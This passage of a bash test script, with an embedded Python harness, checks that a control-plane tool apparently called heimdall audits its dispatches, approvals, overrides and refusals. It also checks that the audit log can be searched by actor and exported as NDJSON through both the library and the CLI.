out["dispatch_refused"] = len(Au.search(event="dispatch_refused", home=home))
out["approval"] = len(Au.search(event="approval", home=home))
out["override"] = len(Au.search(event="override", home=home))
out["job_state"] = len(Au.search(event="job_state", home=home))
out["ingest"] = len(Au.search(event="ingest", home=home))
# searchable by ACTOR too (the owner decided the gates).
out["by_owner"] = len(Au.search(actor_haid="haid:rj.owner", home=home))
# exportable as NDJSON — every line a parseable record.
export_txt = Au.export(home=home)
lines = [ln for ln in export_txt.splitlines() if ln]
out["export_lines"] = len(lines)
out["export_all_parse"] = all(isinstance(json.loads(ln), dict) for ln in lines)
out["total_rows"] = len(Au.read_records(home))
sys.stdout.write(json.dumps(out))
PYEOF

[ -s "$AUDIT_OUT" ] || { echo "FATAL: audit harness produced no output" >&2; cat "$WORK/audit.err" >&2; exit 2; }
ajget() { "$PY" -c "import json; print(json.load(open('$AUDIT_OUT')).get('$1'))"; }

[ "$(ajget dispatch)" -ge 1 ] 2>/dev/null && ok "#7 every DISPATCH is audited ($(ajget dispatch) rows)" || bad "#7 no dispatch audit rows"
[ "$(ajget approval)" -ge 1 ] 2>/dev/null && ok "#7 every APPROVAL is audited ($(ajget approval) rows)" || bad "#7 no approval audit rows"
[ "$(ajget override)" -ge 1 ] 2>/dev/null && ok "#7 every OVERRIDE is audited ($(ajget override) rows)" || bad "#7 no override audit rows"
[ "$(ajget dispatch_refused)" -ge 3 ] 2>/dev/null && ok "#7 every REFUSAL is audited ($(ajget dispatch_refused) rows)" || bad "#7 refusals not all audited"
[ "$(ajget by_owner)" -ge 1 ] 2>/dev/null && ok "#7 audit searchable by ACTOR (owner: $(ajget by_owner) rows)" || bad "#7 audit not searchable by actor"
[ "$(ajget export_lines)" -ge 5 ] 2>/dev/null && [ "$(ajget export_all_parse)" = "True" ] \
  && ok "#7 audit EXPORTABLE as NDJSON ($(ajget export_lines) parseable lines)" || bad "#7 audit not cleanly exportable"

# the real CLI exports the same audit store (the bin/heimdall-control-plane seam).
CLI_REFUSED="$("$CLI" audit --event dispatch_refused --export --home "$HEIMDALL_HOME" 2>/dev/null | grep -c dispatch_refused || true)"
[ "${CLI_REFUSED:-0}" -ge 3 ] && ok "#7 the CLI 'audit --event dispatch_refused --export' streams the refusal rows ($CLI_REFUSED)" || bad "#7 CLI audit export did not surface the refusals ($CLI_REFUSED)"
